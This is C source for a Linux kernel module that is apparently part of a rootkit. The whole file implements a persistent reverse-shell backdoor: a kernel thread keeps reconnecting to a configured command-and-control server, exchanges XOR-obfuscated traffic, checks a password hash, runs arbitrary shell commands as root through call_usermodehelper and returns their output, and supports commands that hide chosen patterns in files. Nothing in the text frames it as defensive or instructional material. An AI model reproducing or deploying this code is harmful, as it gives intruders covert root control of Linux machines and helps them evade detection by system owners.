#include "connection.h"
#include "hide-rootkit/syscall_hook.h"

#include <linux/delay.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/umh.h>
#include <linux/utsname.h>
#include <net/sock.h>
#include <net/tcp.h>



unsigned int wlkom_hash(char *str)
{
	unsigned int hash = 5381;
	int i = 0;

	while (str[i] != '\0' && str[i] != '\n') 
	{
		hash = ((hash << 5) + hash) + str[i];
		i++;
	}

	return hash;
}

void wlkom_xor_buffer(char *data, size_t len)
{
	const char *key = WLKOM_XOR_KEY;
	size_t key_len = strlen(key);
	size_t i;

	for (i = 0; i < len; i++)
	{
		data[i] ^= key[i % key_len];
	}
}

int wlkom_send_data(struct socket *sock, char *data) 
{
	struct msghdr msg;
	struct kvec iov;
	char out[WLKOM_BUFFER_SIZE];
	size_t len = strlen(data);

	if (len >= sizeof(out))
	{
		len = sizeof(out) - 1;
	}

	memset(&msg, 0, sizeof(msg));
	memcpy(out, data, len);
	wlkom_xor_buffer(out, len);

	iov.iov_base = out;
	iov.iov_len = len;

	return kernel_sendmsg(sock, &msg, &iov, 1, iov.iov_len);
}

int wlkom_recv_data(struct socket *sock, char *buffer, size_t size) 
{
	struct msghdr msg;
	struct kvec iov;
	int ret;

	memset(&msg, 0, sizeof(msg));
	memset(buffer, 0, size);

	iov.iov_base = buffer;
	iov.iov_len = size - 1;

	ret = kernel_recvmsg(sock, &msg, &iov, 1, size - 1, MSG_DONTWAIT);
	if (ret > 0) 
	{
		wlkom_xor_buffer(buffer, ret);
		buffer[ret] = '\0';
	}

	return ret;
}

int wlkom_handle_auth(struct socket *sock, char *buffer, int *authenticated)
{
	char *password = buffer + 5;

	if (wlkom_hash(password) == WLKOM_PASSWORD_HASH) 
	{
		*authenticated = 1;
		return wlkom_send_data(sock, "OK authenticated\n");
	}

	return wlkom_send_data(sock, "ERR bad password\n");
}



int wlkom_handle_exec(struct socket *sock, char *buffer) 
{
	char wlkom_cwd[256] = "/";
	char wlkom_exec_stdout[WLKOM_BUFFER_SIZE];
	char wlkom_exec_stderr[WLKOM_BUFFER_SIZE];

	char *cmd = buffer + 5;
	size_t cmd_len;
	char full_cmd[512];
	char *argv[] = {"/bin/sh", "-c", full_cmd, NULL};
	static char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
	struct file *f;
	loff_t pos = 0;
	int ret;
	char *pwd_pos;

	for (cmd_len = strlen(cmd); cmd_len > 0 && cmd[cmd_len - 1] == '\n'; cmd_len--)
	{
		cmd[cmd_len - 1] = '\0';
	}

	memset(wlkom_exec_stdout, 0, sizeof(wlkom_exec_stdout));
	memset(wlkom_exec_stderr, 0, sizeof(wlkom_exec_stderr));

	snprintf(full_cmd, sizeof(full_cmd),
			"cd '%s' 2>/dev/null; %s > /tmp/wlkom_out 2>/tmp/wlkom_err; "
			"EXIT_CODE=$?; echo \"PWD:$PWD\" >> /tmp/wlkom_out; exit $EXIT_CODE",
			wlkom_cwd, cmd);

	ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	if (ret < 0)
	{
		return wlkom_send_data(sock, "ERR exec failed\n");
	}
	int exit_code = (ret >> 8) & 0xff;

	f = filp_open("/tmp/wlkom_out", O_RDONLY, 0);
	if (!IS_ERR(f)) 
	{
		ret = kernel_read(f, wlkom_exec_stdout, sizeof(wlkom_exec_stdout) - 1, &pos);
		if (ret > 0)
		{
			wlkom_exec_stdout[ret] = '\0';
		}
		filp_close(f, NULL);
	}

	pos = 0;
	f = filp_open("/tmp/wlkom_err", O_RDONLY, 0);
	if (!IS_ERR(f)) 
	{
		ret = kernel_read(f, wlkom_exec_stderr, sizeof(wlkom_exec_stderr) - 1, &pos);
		if (ret > 0)
		{
			wlkom_exec_stderr[ret] = '\0';
		}
		filp_close(f, NULL);
	}

	pwd_pos = strstr(wlkom_exec_stdout, "PWD:");
	if (pwd_pos) 
	{
		char *pwd_path = pwd_pos + 4;
		char *pwd_end = strchr(pwd_path, '\n');
		if (!pwd_end)
		{
			pwd_end = pwd_path + strlen(pwd_path);
		}
		size_t len = pwd_end - pwd_path;
		if (len > 0 && len < sizeof(wlkom_cwd)) 
		{
			memcpy(wlkom_cwd, pwd_path, len);
			wlkom_cwd[len] = '\0';
		}
		*pwd_pos = '\0';
	}

  
    char *rm_argv[] = {"/bin/rm", "-f", "/tmp/wlkom_out", "/tmp/wlkom_err",
                       NULL};
    call_usermodehelper(rm_argv[0], rm_argv, envp, UMH_WAIT_PROC);
  

	if (strlen(wlkom_exec_stdout) > 0)
	{
		wlkom_send_data(sock, wlkom_exec_stdout);
	}

	if (strlen(wlkom_exec_stderr) > 0)
	{
		char err_prefixed[WLKOM_BUFFER_SIZE + 8];
		snprintf(err_prefixed, sizeof(err_prefixed), "STDERR:%s",
				wlkom_exec_stderr);
		wlkom_send_data(sock, err_prefixed);
	}

  
    char exit_line[64];
    snprintf(exit_line, sizeof(exit_line), "\nEXIT:%d PWD:%s\n", exit_code, wlkom_cwd);
    return wlkom_send_data(sock, exit_line);
  
}

int wlkom_handle_command(struct socket *sock, char *buffer, int *authenticated)
{
	if (strncmp(buffer, "PING", 4) == 0)
	{
		return wlkom_send_data(sock, "PONG\n");
	}

	if (strncmp(buffer, "QUIT", 4) == 0) 
	{
		wlkom_send_data(sock, "BYE\n");
		return 1;
	}

	if (strncmp(buffer, "AUTH ", 5) == 0)
	{
		return wlkom_handle_auth(sock, buffer, authenticated);

	}
	if (strncmp(buffer, "HELP", 4) == 0)
	{
		return wlkom_send_data(sock, "OK commands: PING AUTH HELP INFO EXEC QUIT\n");
	}
	if (!*authenticated)
	{
		return wlkom_send_data(sock, "ERR unauthorized\n");
	}
	if (strncmp(buffer, "EXEC ", 5) == 0) 
	{
		return wlkom_handle_exec(sock, buffer);
	}
	if (strncmp(buffer, "INFO", 4) == 0)
	{
		char info_buf[WLKOM_BUFFER_SIZE];
		struct new_utsname *u = utsname();
		snprintf(info_buf, sizeof(info_buf), "sysname=%s release=%s machine=%s\n", u->sysname, u->release, u->machine);
		return wlkom_send_data(sock, info_buf);
	}

	if (strncmp(buffer, "HIDE_ADD", 8) == 0)
	{
		return wlkom_handle_hide_add(sock, buffer + 9);
	}
	if (strncmp(buffer, "HIDE_DEL", 8) == 0)
	{
		return wlkom_handle_hide_del(sock, buffer + 9);

	}
	if (strncmp(buffer, "HIDE_INFO", 9) == 0)
	{
		return wlkom_handle_hide_info(sock);

	}
	if (strncmp(buffer, "HIDE_HELP", 9) == 0)
	{
		return wlkom_send_data(sock, "-> HIDE_ADD <pattern_to_hide> <path_to_file> \n\t-> Add a pattern to hide in a specific file\n-> HIDE_DEL <pattern_to_hide> <path_to_file> \n\t-> Delete a pattern\n-> HIDE_INFO \n\t-> List all the hidded pattern and their file");
	}

	return wlkom_send_data(sock, "ERR unknown command\n");
}

int wlkom_session(struct socket *sock)
{
	char buffer[WLKOM_BUFFER_SIZE];
	int authenticated = 0;
	int ret;

	while (!kthread_should_stop())
	{

		ret = wlkom_recv_data(sock, buffer, sizeof(buffer));

		if (ret == -EAGAIN || ret == -EWOULDBLOCK) 
		{
		msleep(WLKOM_POLL_DELAY);
		continue;
		}

		if (ret <= 0) 
		{
		pr_info("wlkom_log: disconnected\n");
		return ret;
		}

		pr_info("wlkom_log: received command: %s", buffer);

		ret = wlkom_handle_command(sock, buffer, &authenticated);
		if (ret == 1)
		{
		return 0;
		}

		if (ret < 0) 
		{
		pr_info("wlkom_log: command response failed: %d\n", ret);
		return ret;
		}
	}

	return 0;
}

int wlkom_connect_once(void)
{
	struct socket *sock;
	struct sockaddr_in addr;
	int ret;

	pr_info("wlkom_log: trying to connect to %s:%d\n", WLKOM_SERVER_IP,
			WLKOM_SERVER_PORT);

	ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
	if (ret < 0) 
	{
		pr_info("wlkom_log: socket creation failed: %d\n", ret);
		return ret;
	}

	memset(&addr, 0, sizeof(addr));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(WLKOM_SERVER_PORT);
	addr.sin_addr.s_addr = in_aton(WLKOM_SERVER_IP);

	ret = kernel_connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
	if (ret < 0) 
	{
		pr_info("wlkom_log: connection failed: %d\n", ret);
		sock_release(sock);
		return ret;
	}

	pr_info("wlkom_log: connected\n");

  
    struct tcp_sock *tp = tcp_sk(sock->sk);
    sock_set_flag(sock->sk, SOCK_KEEPOPEN);
    tp->keepalive_time = 10 * HZ;
    tp->keepalive_intvl = 5 * HZ;
    tp->keepalive_probes = 3;
  

	ret = wlkom_session(sock);

	sock_release(sock);

	return ret;
}

int wlkom_connection_thread(void *data) 
{
	(void)data;

	while (!kthread_should_stop()) 
	{
		wlkom_connect_once();
		msleep_interruptible(WLKOM_RETRY_DELAY);
	}

	return 0;
}

int wlkom_handle_hide_info(struct socket *sock)
{
	struct line_hidded *cur = hide_list;
	char buffer[256];
	int ret;

	while (cur) 
	{
		snprintf(buffer, sizeof(buffer), "pattern=%s path=%s\n",
				cur->str_pattern ? cur->str_pattern : "NULL",
				cur->path ? cur->path : "NULL");

		ret = wlkom_send_data(sock, buffer);
		if (ret < 0)
		{
			return ret;
		}

		cur = cur->next;
	}

	return wlkom_send_data(sock, "END\n");
}

int wlkom_handle_hide_add(struct socket *sock, char *buffer) 
{
	struct line_hidded *node;
	char *pattern;
	char *path;

	pattern = strim(strsep(&buffer, " "));
	path = strim(buffer);

	if (!pattern || !path)
	{
		return wlkom_send_data(sock, "Wlkom_hide: Err pattern or path is null\n");
	}

	int res = wlkom_hide_add(pattern, path);

	return (res ? wlkom_send_data(sock, "Wlkom_response : hide line correctly added\n"):
			wlkom_send_data(sock, "Wlkom_response : Err when creating object\n"));

}

int wlkom_handle_hide_del(struct socket *sock, char *buffer) 
{
	struct line_hidded *cur = hide_list;
	struct line_hidded *prev = NULL;

	char *pattern;
	char *path;

	pattern = strim(strsep(&buffer, " "));
	path = strim(buffer);

	while (cur) 
	{
		if (cur->str_pattern && cur->path &&
			strcmp(cur->str_pattern, pattern) == 0 &&
			strcmp(cur->path, path) == 0) 
		{
			if (prev)
			{
				prev->next = cur->next;
			}
			else
			{
				hide_list = cur->next;
			}

			kfree(cur->str_pattern);
			kfree(cur->path);
			kfree(cur);

			return wlkom_send_data(sock, "Wlkom_response : hide line correctly deleted");
		}

		prev = cur;
		cur = cur->next;
	}

	return wlkom_send_data(sock, "ERR pattern not found\n");
}
